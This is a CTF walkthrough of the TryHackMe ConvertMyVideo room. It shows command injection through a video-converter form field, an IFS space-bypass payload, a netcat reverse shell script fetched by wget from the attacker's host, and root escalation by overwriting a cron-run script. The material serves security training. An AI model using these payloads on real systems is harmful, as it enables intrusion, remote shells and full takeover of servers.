# ConvertMyVideo Walkthrough

## Intro
Welcome to the ConvertMyVideo challenge, here is the link to the [room](https://tryhackme.com/room/convertmyvideo) on TryHackMe.

In this challenge we will deal with some web enumeration to find a vulnerability in one of the app's functionalities to gain initial access to the target and move up.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
We can start with a port scan to understand which services are online and accessible:
```bash
rustscan -a  10.80.149.239 -r 0-65535  --ulimit 5000 -- -sV -sC
```

We see port 22 and 80 open, the usual ones for SSH and a website.
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1FkWVdXpiZN4JOheh/PVSTjXUgnhMNTFvHNzlip8x6vsFTwIwtP0+5xlYGjtLorEAS0KpJLtpzFO4p4PvEzMC40SY8E+i4LaiXHcMsJrbhIozUjZssBnbfgYPiwCzMICKygDSfG83zCC/ZiXeJKWfVEvpCVX1g5Al16mzQQnB3qPyz8TmSQ+Kgy7GRc+nnPvPbAdh8meVGcSl9bzGuXoFFEAH5RS8D92JpWDRuTVqCXGxZ4t4WgboFPncvau07A3Kl8BoeE8kDa3DUbPYyn3gwJd55khaJSxkKKlAB/f98zXfQnU0RQbiAlC88jD2TmK8ovd2IGmtqbuenHcNT01D
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)                                                                                      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3zR5EsH+zXjBa4GNOE8Vlf04UROD9GrpAgx0mRcrDQvUdmaF0hYse2KixpRS8Pu1qhWKVRP7nz0LX5nbzb4i4=
|   256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBKsS7+8A3OfoY8qtnKrVrjFss8LQhVeMqXeDnESa6Do
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:                                                                                                                                      |_  Supported Methods: GET HEAD POST OPTIONS                                                       |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

Visit the website at `http://10.80.149.239`.
In the meantime we can also start a directory scan:
```bash
gobuster dir -u http://10.80.149.239/  -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```

With this one we find `/admin`, visiting it we can see that it is using the simple http login, and we get prompted for credentials in a pop-up.
Since at the moment we do not have any hint on any credentials yet, we could either try to brute force it or look around for other paths.

Back to the main page we can check the source code and find a JavaScript file called `main.js`, looking at it we find the code that handles the video converter:
```js
$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```

Sending a test URL and capturing the request with *BurpSuite* we get:
```http
POST / HTTP/1.1
Host: 10.80.149.239
Content-Length: 55
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Origin: http://10.80.149.239
Referer: http://10.80.149.239/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dtest
```

The URL is passed in the `yt_url` field, some characters are URL encoded and our input gets appended to `https://www.youtube.com/watch?v=` as we have already noticed in the JS code.
If we try to manipulate that field, for example with `yt_url=;whoami;` we get an error message but also the name of the user:
```http
HTTP/1.1 200 OK
Date: Sun, 08 Feb 2026 20:58:18 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 445
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";whoami;","output":"www-data\n","result_url":"\/tmp\/downloads\/6988f8ea2c394.mp3"}
```

This means that we can run commands via that on the server as the user "www-data".
We can try to read the `passwd` file with `;cat /etc/passwd;` but this time it fails. This is likely because of the space between the `cat` command and the file path.
In the shell we can use command substitution `${COMMAND_HERE}` which basically execute whats inside and then substitute that value returned with the block `${}` itself, in our case  `IFS` gets interpreted as a white space, exactly what we need between our 2 words here.
With all this in mind we can make it like this:
```
yt_url=;cat${IFS}/etc/passwd
```

This works just fine and we do not get any errors, in fact we get the full passwd file output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
dmv:x:1000:1000:dmv:/home/dmv:/bin/bash
```

Now we can either use this method to read other files, maybe the server configs and search for creds directly here or even better, since this is an RCE vulnerability just create and upload a reverse shell.
Let's make a bash reverse shell:
```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 1234 >/tmp/f
```

Save it as `myshell.sh`, in the same directory we spin up a python HTTP server, this way we might be able to pull it running a `wget`:
```bash
python3 -m http.server
```

```bash
yt_url=;wget${IFS}http://YOURIP:8000/myshell.sh;
```

Now prepare a listener:
```bash
nc -lvnp 1234
```

Finally we trigger the shell with another request:
```
yt_url=;bash${IFS}myshell.sh;
```

And we should get a reverse shell in a second in our listener.

Since the shell is quite limited and unstable we can upgrade it, i have made a guide on how to do it [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/cc63a5d9c321d09c543ac66c63856e733b1d3e21/Tips-%26-Resources/Reverse_Shell-Upgrade.md)

Now that we are inside the system we can get the first user flag:
```bash
cat admin/flag.txt
```
--> REDACTED

Listing in the same directory we find another file worth looking at:
```bash
cat .htpasswd
```

We get `itsm...REDACTED:$apr1$tbcm2uwv$UP1ylvgp4...REDACTED`, and here we have the answer to the question about the username:
--> REDACTED

<br/>

### Privilege Escalation
It is time to look around to find a way to escalate our privileges.

In `/var/www/html/tmp` we find a file called `clean.sh`, from further investigation we understand that this file gets ran every minute via *cron* by the user root.
This mean we can change it's content and since it will be executed as root we can either read the flag or drop inside another reverse shell, prepare a second listener and get a root shell.

Either way we get the `root.txt` content.
Since this is only a CTF i personally went for the faster route of:
```
echo "cat /root/root.txt" > /var/www/html/tmp/flag
```

Then read the flag as the unprivileged user:
```bash
cat flag
```

--> REDACTED

<br/>
<br/>

Congratulations, you have successfully got into the target system by dropping a reverse shell and finally escalated your privileges to root exploiting a recurring task.

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
